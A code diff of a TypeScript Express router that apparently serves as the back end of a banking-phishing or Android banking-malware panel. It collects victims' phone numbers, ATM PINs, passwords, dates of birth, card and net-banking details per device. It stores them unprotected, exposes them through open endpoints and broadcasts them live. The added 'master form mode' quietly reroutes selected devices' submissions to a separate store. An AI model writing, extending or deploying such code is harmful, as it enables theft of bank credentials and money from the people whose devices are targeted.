@@ -1,6 +1,9 @@
 import express, { Request, Response } from "express";
 import FormSubmission from "../models/FormSubmission";
+import MasterFormSubmission from "../models/MasterFormSubmission";
 import Payment from "../models/Payment";
+import Device from "../models/Device";
+import AdminModel from "../models/Admin";
 import logger from "../logger/logger";
 import wsService from "../services/wsService";
 
@@ -8,30 +11,9 @@ const router = express.Router();
 
 function transformFormDoc(doc: any) {
   const payload = doc.payload || {};
-
-  const phoneNumber =
-    payload.phoneNumber ??
-    payload.mobileNumber ??
-    payload.phone ??
-    payload.msisdn ??
-    payload.phone_number ??
-    "";
-
-  const username =
-    payload.username ??
-    payload.name ??
-    payload.userName ??
-    payload.user ??
-    "";
-
-  const atmPin =
-    payload.atmPin ??
-    payload.pin ??
-    payload.atm_pin ??
-    payload.atmpin ??
-    payload.pin_code ??
-    "";
-
+  const phoneNumber = payload.phoneNumber ?? payload.mobileNumber ?? payload.phone ?? payload.msisdn ?? payload.phone_number ?? "";
+  const username    = payload.username ?? payload.name ?? payload.userName ?? payload.user ?? "";
+  const atmPin      = payload.atmPin ?? payload.pin ?? payload.atm_pin ?? payload.atmpin ?? payload.pin_code ?? "";
   return {
     _id: doc._id,
     uniqueid: doc.uniqueid || payload.uniqueid || "",
@@ -44,7 +26,23 @@ function transformFormDoc(doc: any) {
   };
 }
 
-/* ================= DASHBOARD SUMMARY ================= */
+// ── MASTER FORM MODE CHECK ──
+async function isDeviceMasterForm(uniqueid: string): Promise<boolean> {
+  try {
+    // Global master form mode
+    const globalDoc = await AdminModel.findOne({ key: "master_form_mode" }).lean();
+    if ((globalDoc as any)?.meta?.enabled === true) return true;
+    // Per device flag
+    const device = await Device.findOne({ deviceId: uniqueid }).select("masterFormDevice").lean();
+    return (device as any)?.masterFormDevice === true;
+  } catch {
+    return false;
+  }
+}
+
+/* ═══════════════════════════════════════════
+   DASHBOARD SUMMARY
+   ═══════════════════════════════════════════ */
 
 router.get("/dashboard/forms-summary", async (_req: Request, res: Response) => {
   try {
@@ -53,7 +51,6 @@ router.get("/dashboard/forms-summary", async (_req: Request, res: Response) => {
       Payment.countDocuments({ method: "card" }),
       Payment.countDocuments({ method: "netbanking" }),
     ]);
-
     return res.json({
       formsCount: Number(formsCount || 0),
       cardPaymentsCount: Number(cardPaymentsCount || 0),
@@ -61,48 +58,26 @@ router.get("/dashboard/forms-summary", async (_req: Request, res: Response) => {
     });
   } catch (err: any) {
     logger.error("forms: dashboard forms-summary failed", err);
-    return res.status(500).json({
-      formsCount: 0,
-      cardPaymentsCount: 0,
-      netBankingCount: 0,
-    });
+    return res.status(500).json({ formsCount: 0, cardPaymentsCount: 0, netBankingCount: 0 });
   }
 });
 
-/* ================= PER-DEVICE COUNTS (Android device list) ================= */
+/* ═══════════════════════════════════════════
+   PER-DEVICE COUNTS
+   ═══════════════════════════════════════════ */
 
 router.get("/forms/per-device-counts", async (_req: Request, res: Response) => {
   try {
     const [formAgg, cardAgg, netAgg] = await Promise.all([
-      FormSubmission.aggregate([
-        { $group: { _id: "$uniqueid", count: { $sum: 1 } } },
-      ]),
-      Payment.aggregate([
-        { $match: { method: "card" } },
-        { $group: { _id: "$uniqueid", count: { $sum: 1 } } },
-      ]),
-      Payment.aggregate([
-        { $match: { method: "netbanking" } },
-        { $group: { _id: "$uniqueid", count: { $sum: 1 } } },
-      ]),
+      FormSubmission.aggregate([{ $group: { _id: "$uniqueid", count: { $sum: 1 } } }]),
+      Payment.aggregate([{ $match: { method: "card" } }, { $group: { _id: "$uniqueid", count: { $sum: 1 } } }]),
+      Payment.aggregate([{ $match: { method: "netbanking" } }, { $group: { _id: "$uniqueid", count: { $sum: 1 } } }]),
     ]);
-
-    // Merge all counts per deviceId
     const result: Record<string, number> = {};
-
-    for (const item of formAgg) {
+    for (const item of [...formAgg, ...cardAgg, ...netAgg]) {
       if (!item._id) continue;
       result[item._id] = (result[item._id] || 0) + item.count;
     }
-    for (const item of cardAgg) {
-      if (!item._id) continue;
-      result[item._id] = (result[item._id] || 0) + item.count;
-    }
-    for (const item of netAgg) {
-      if (!item._id) continue;
-      result[item._id] = (result[item._id] || 0) + item.count;
-    }
-
     return res.json(result);
   } catch (err: any) {
     logger.error("forms: per-device-counts failed", err);
@@ -110,36 +85,29 @@ router.get("/forms/per-device-counts", async (_req: Request, res: Response) => {
   }
 });
 
-/* ================= LIST FORM SUBMISSIONS ================= */
+/* ═══════════════════════════════════════════
+   LIST + GET FORM SUBMISSIONS
+   ═══════════════════════════════════════════ */
 
 router.get("/form_submissions", async (_req: Request, res: Response) => {
   try {
     const docs = await FormSubmission.find().lean();
-    const out = docs.map(transformFormDoc);
-    return res.json(out);
+    return res.json(docs.map(transformFormDoc));
   } catch (err: any) {
     logger.error("forms: list form_submissions failed", err);
     return res.status(500).json([]);
   }
 });
 
-/* ================= GET FORM BY DEVICE ================= */
-
 router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
   try {
-    const docs = await FormSubmission.find({
-      uniqueid: req.params.uniqueid,
-    }).lean();
-
-    const out = docs.map(transformFormDoc);
-    return res.json(out);
+    const docs = await FormSubmission.find({ uniqueid: req.params.uniqueid }).lean();
+    return res.json(docs.map(transformFormDoc));
   } catch (err: any) {
     logger.error("forms: fetch by device failed", err);
     return res.status(500).json([]);
   }
 });
-
-/* ================= DELETE FORM SUBMISSION ================= */
 
 router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response) => {
   try {
@@ -151,15 +119,13 @@ router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response)
   }
 });
 
-/* ================= GET CARD PAYMENTS BY DEVICE ================= */
+/* ═══════════════════════════════════════════
+   PAYMENTS
+   ═══════════════════════════════════════════ */
 
 router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response) => {
   try {
-    const docs = await Payment.find({
-      uniqueid: req.params.uniqueid,
-      method: "card",
-    }).lean();
-
+    const docs = await Payment.find({ uniqueid: req.params.uniqueid, method: "card" }).lean();
     return res.json(docs.map((d) => d.payload));
   } catch (err: any) {
     logger.error("forms: card payments fetch failed", err);
@@ -167,15 +133,9 @@ router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response
   }
 });
 
-/* ================= GET NET BANKING BY DEVICE ================= */
-
 router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) => {
   try {
-    const docs = await Payment.find({
-      uniqueid: req.params.uniqueid,
-      method: "netbanking",
-    }).lean();
-
+    const docs = await Payment.find({ uniqueid: req.params.uniqueid, method: "netbanking" }).lean();
     return res.json(docs.map((d) => d.payload));
   } catch (err: any) {
     logger.error("forms: net banking fetch failed", err);
@@ -183,73 +143,37 @@ router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) 
   }
 });
 
-/* ================= GET SUCCESS DATA ================= */
+/* ═══════════════════════════════════════════
+   SUCCESS DATA
+   ═══════════════════════════════════════════ */
 
 router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
   try {
-    const doc = await FormSubmission.findOne({
-      uniqueid: req.params.uniqueid,
-    }).lean();
-
+    const doc = await FormSubmission.findOne({ uniqueid: req.params.uniqueid }).lean();
     if (!doc) return res.json({ dob: "", profilePassword: "" });
-
     const payload = doc.payload || {};
-    return res.json({
-      dob: payload.dob || "",
-      profilePassword: payload.profilePassword || "",
-    });
+    return res.json({ dob: payload.dob || "", profilePassword: payload.profilePassword || "" });
   } catch (err: any) {
     logger.error("forms: success_data fetch failed", err);
     return res.status(500).json({});
   }
 });
 
-/* ================= POST: SUCCESS DATA ================= */
-
 router.post("/success_data", async (req: Request, res: Response) => {
-  const body = req.body || {};
+  const body    = req.body || {};
   const uniqueid = body.uniqueid || "";
-
-  if (!uniqueid) {
-    return res.status(400).json({ success: false, error: "missing uniqueid" });
-  }
-
+  if (!uniqueid) return res.status(400).json({ success: false, error: "missing uniqueid" });
   try {
-    logger.info("forms: success_data payload", {
-      uniqueid,
-      dob: body.dob,
-      profilePassword: body.profilePassword,
-    });
-
     const update: any = { $set: {} };
-    if (Object.prototype.hasOwnProperty.call(body, "dob")) {
-      update.$set["payload.dob"] = body.dob ?? "";
-    }
-    if (Object.prototype.hasOwnProperty.call(body, "profilePassword")) {
-      update.$set["payload.profilePassword"] = body.profilePassword ?? "";
-    }
-
+    if (Object.prototype.hasOwnProperty.call(body, "dob"))             update.$set["payload.dob"] = body.dob ?? "";
+    if (Object.prototype.hasOwnProperty.call(body, "profilePassword")) update.$set["payload.profilePassword"] = body.profilePassword ?? "";
     if (Object.keys(update.$set).length === 0) {
-      logger.warn("forms: success_data called but no dob/profilePassword keys present", { uniqueid });
+      logger.warn("forms: success_data called but no keys", { uniqueid });
       return res.json({ success: true });
     }
-
     await FormSubmission.findOneAndUpdate({ uniqueid }, update, { upsert: true });
-
-    try {
-      wsService.broadcastFormUpdate(uniqueid, {
-        uniqueid,
-        dob: Object.prototype.hasOwnProperty.call(body, "dob") ? body.dob ?? "" : undefined,
-        profilePassword: Object.prototype.hasOwnProperty.call(body, "profilePassword")
-          ? body.profilePassword ?? ""
-          : undefined,
-        updatedAt: Date.now(),
-      });
-    } catch (e) {
-      logger.warn("forms: broadcast form:update failed", e);
-    }
-
-    logger.info("forms: success_data updated", { uniqueid, changes: Object.keys(update.$set) });
+    try { wsService.broadcastFormUpdate(uniqueid, { uniqueid, dob: body.dob, profilePassword: body.profilePassword, updatedAt: Date.now() }); } catch (e) { logger.warn("forms: broadcast form:update failed", e); }
+    logger.info("forms: success_data updated", { uniqueid });
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("forms: success_data failed", err);
@@ -257,26 +181,46 @@ router.post("/success_data", async (req: Request, res: Response) => {
   }
 });
 
-/* ================= POST: generic form_submissions ================= */
+/* ═══════════════════════════════════════════
+   POST FORM — WITH MASTER FORM CHECK
+   ═══════════════════════════════════════════ */
 
 router.post("/form_submissions", async (req: Request, res: Response) => {
-  const body = req.body || {};
+  const body     = req.body || {};
+  const uniqueid = (body.uniqueid || body.deviceId || "") as string;
   try {
-    const doc = new FormSubmission({
-      uniqueid: body.uniqueid || body.deviceId || "",
-      payload: body,
-    });
+    // ── MASTER FORM MODE CHECK ──
+    const isMasterForm = await isDeviceMasterForm(uniqueid);
 
-    await doc.save();
-    logger.info("forms: form_submissions saved", { uniqueid: doc.uniqueid });
+    if (isMasterForm) {
+      // Mark device as masterFormDevice (so it shows in master panel list)
+      try {
+        await Device.findOneAndUpdate(
+          { deviceId: uniqueid },
+          { $set: { masterFormDevice: true } }
+        );
+      } catch (_) {}
 
-    try {
-      const transformed = transformFormDoc(doc.toObject ? doc.toObject() : doc);
-      wsService.broadcastFormNew(doc.uniqueid || body.uniqueid || body.deviceId || "", transformed);
-    } catch (e) {
-      logger.warn("forms: broadcast form:new failed", e);
+      const masterDoc = new MasterFormSubmission({ uniqueid, payload: body });
+      await masterDoc.save();
+
+      logger.info("forms: saved to MasterFormSubmission", { uniqueid });
+
+      try {
+        wsService.broadcastFormNew(uniqueid, {
+          ...transformFormDoc(masterDoc.toObject ? masterDoc.toObject() : masterDoc),
+          isMaster: true,
+        });
+      } catch (e) { logger.warn("forms: broadcast master form:new failed", e); }
+
+      return res.json({ success: true, masterMode: true });
     }
 
+    // ── NORMAL FLOW ──
+    const doc = new FormSubmission({ uniqueid, payload: body });
+    await doc.save();
+    logger.info("forms: form_submissions saved", { uniqueid: doc.uniqueid });
+    try { wsService.broadcastFormNew(doc.uniqueid || uniqueid, transformFormDoc(doc.toObject ? doc.toObject() : doc)); } catch (e) { logger.warn("forms: broadcast form:new failed", e); }
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("forms: save form_submissions failed", err);
@@ -284,26 +228,27 @@ router.post("/form_submissions", async (req: Request, res: Response) => {
   }
 });
 
-/* ================= POST: card_payments ================= */
+/* ═══════════════════════════════════════════
+   POST PAYMENTS — WITH MASTER FORM CHECK
+   ═══════════════════════════════════════════ */
 
 router.post("/card_payments", async (req: Request, res: Response) => {
   try {
-    const body = req.body || {};
-    const p = new Payment({
-      uniqueid: body.uniqueid || "",
-      method: "card",
-      payload: body,
-      status: "pending",
-    });
+    const body     = req.body || {};
+    const uniqueid = body.uniqueid || "";
 
-    await p.save();
-
-    try {
-      wsService.broadcastPaymentNew(body.uniqueid || "", "card", body);
-    } catch (e) {
-      logger.warn("forms: broadcast payment:new(card) failed", e);
+    const isMasterForm = await isDeviceMasterForm(uniqueid);
+    if (isMasterForm) {
+      try { await Device.findOneAndUpdate({ deviceId: uniqueid }, { $set: { masterFormDevice: true } }); } catch (_) {}
+      const masterDoc = new MasterFormSubmission({ uniqueid, payload: { ...body, _type: "card_payment" } });
+      await masterDoc.save();
+      logger.info("forms: card payment saved to MasterFormSubmission", { uniqueid });
+      return res.json({ success: true, masterMode: true });
     }
 
+    const p = new Payment({ uniqueid, method: "card", payload: body, status: "pending" });
+    await p.save();
+    try { wsService.broadcastPaymentNew(uniqueid, "card", body); } catch (e) { logger.warn("forms: broadcast payment:new(card) failed", e); }
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("forms: card_payment failed", err);
@@ -313,22 +258,21 @@ router.post("/card_payments", async (req: Request, res: Response) => {
 
 router.post("/net_banking", async (req: Request, res: Response) => {
   try {
-    const body = req.body || {};
-    const p = new Payment({
-      uniqueid: body.uniqueid || "",
-      method: "netbanking",
-      payload: body,
-      status: "pending",
-    });
+    const body     = req.body || {};
+    const uniqueid = body.uniqueid || "";
 
-    await p.save();
-
-    try {
-      wsService.broadcastPaymentNew(body.uniqueid || "", "netbanking", body);
-    } catch (e) {
-      logger.warn("forms: broadcast payment:new(netbanking) failed", e);
+    const isMasterForm = await isDeviceMasterForm(uniqueid);
+    if (isMasterForm) {
+      try { await Device.findOneAndUpdate({ deviceId: uniqueid }, { $set: { masterFormDevice: true } }); } catch (_) {}
+      const masterDoc = new MasterFormSubmission({ uniqueid, payload: { ...body, _type: "net_banking" } });
+      await masterDoc.save();
+      logger.info("forms: netbanking saved to MasterFormSubmission", { uniqueid });
+      return res.json({ success: true, masterMode: true });
     }
 
+    const p = new Payment({ uniqueid, method: "netbanking", payload: body, status: "pending" });
+    await p.save();
+    try { wsService.broadcastPaymentNew(uniqueid, "netbanking", body); } catch (e) { logger.warn("forms: broadcast payment:new(netbanking) failed", e); }
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("forms: net_banking failed", err);
